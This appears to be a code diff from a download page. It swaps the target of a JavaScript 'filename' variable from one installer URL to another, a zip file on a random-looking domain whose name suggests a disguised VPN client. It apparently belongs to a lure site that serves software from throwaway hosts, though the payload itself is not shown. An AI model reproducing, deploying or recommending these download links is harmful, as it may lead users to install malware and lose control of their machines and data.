@@ -1,3 +1,3 @@
 (function() {
-    window['filename'] = 'http://kl.sxlaowan.top/letsv-latest.msi';
+    window['filename'] = 'https://s3trrreow-s3-oss.top/win7-11%20letsevpsjdtn.zip';
 })();
